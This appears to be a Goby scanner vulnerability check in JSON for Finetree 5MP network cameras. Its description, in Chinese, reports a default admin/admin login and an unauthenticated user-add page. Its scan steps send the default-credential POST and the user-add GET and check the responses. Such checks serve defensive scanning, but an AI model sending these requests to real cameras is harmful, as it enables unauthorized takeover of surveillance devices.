{
      "Name": "Finetree-5MP-摄像机 默认口令 未授权任意用户添加",
      "Level": "3",
      "Tags": [],
      "GobyQuery": "title=\"5MP Network Camera\"",
      "Description": "Finetree-5MP-摄像机存在默认口令admin/admin 和 未授权任意用户添加 /quicksetup/user_pop.php?method=add",
      "Product": "Finetree-5MP",
      "Homepage": "",
      "Author": "",
      "Impact": "",
      "Recommandation": "<p>undefined</p>",
      "References": [],
      "ScanSteps": [
            "OR",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/",
                        "follow_redirect": false,
                        "header": {
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "user=admin&pwd=admin&method=login"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "302",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/quicksetup/user_pop.php?method=add",
                        "follow_redirect": false,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Add User",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "2021-06-04 10:49:21",
      "GobyVersion": "1.8.268"
}